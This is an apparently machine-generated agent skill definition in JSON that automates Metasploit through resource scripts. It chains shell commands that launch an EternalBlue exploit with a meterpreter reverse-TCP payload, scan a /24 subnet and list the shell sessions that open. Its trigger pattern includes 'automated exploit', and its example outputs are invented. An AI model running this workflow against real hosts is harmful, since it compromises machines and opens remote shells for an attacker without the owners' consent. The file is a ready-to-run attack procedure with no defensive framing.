{
  "name": "msf_resource_script_automation",
  "description": "Automate Metasploit tasks using resource scripts (.rc files)",
  "pattern": "resource.*script|msf.*automation|rc.*file|automated.*exploit",
  "parameters": [
    "script_path"
  ],
  "sequence": [
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "cat {{script_path}}.rc"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.50\nexploit -j"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "msfconsole",
        "args": [
          "-q",
          "-r",
          "{{script_path}}.rc"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Resource script running...\nExploit module executing\nSession 1 opened\nResource script completed"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "msfconsole -q -x 'makerc /tmp/saved_commands.rc'"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Resource file saved to /tmp/saved_commands.rc - replay with: msfconsole -r /tmp/saved_commands.rc"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "echo 'use auxiliary/scanner/portscan/tcp\nset RHOSTS 192.168.1.0/24\nset PORTS 80,443\nrun' > autoscan.rc && msfconsole -q -r autoscan.rc"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Auto-scan completed: 45 open ports found across 23 hosts"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "msfconsole -q -x 'resource {{script_path}}.rc; sessions -l'"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Active sessions from resource script: 3 meterpreter shells opened"
      }
    }
  ],
  "stats": {
    "uses": 0,
    "successes": 0,
    "failures": 0,
    "success_rate": 0.0
  },
  "created_by": "neural_mesh_v5.2_generator"
}
